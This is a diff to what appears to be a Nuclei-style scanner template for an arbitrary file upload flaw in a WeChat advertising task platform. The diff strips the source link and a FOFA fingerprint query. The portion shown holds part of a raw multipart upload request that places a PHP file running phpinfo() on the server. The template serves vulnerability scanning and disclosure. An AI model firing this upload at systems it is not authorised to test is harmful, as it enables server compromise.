@@ -3,12 +3,8 @@ info:
   name: 微信广告任务平台存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wx80o737u487u8qa'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wx80o737u487u8qa
-    fofa: '"/tpl/Public/js/func.js"'
 http:
 - raw:
   - '注意 这里需要普通用户登录之后操作.
@@ -43,9 +39,7 @@ http:
 
     <?php phpinfo();?>
 
-    ------WebKitFormBoundaryCc7iBZFp1mvojsxn--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413552330-8ff263ce-025d-4246-bd63-03dba71fd883.png)'
+    ------WebKitFormBoundaryCc7iBZFp1mvojsxn--'
   redirects: false
   matchers:
   - status:
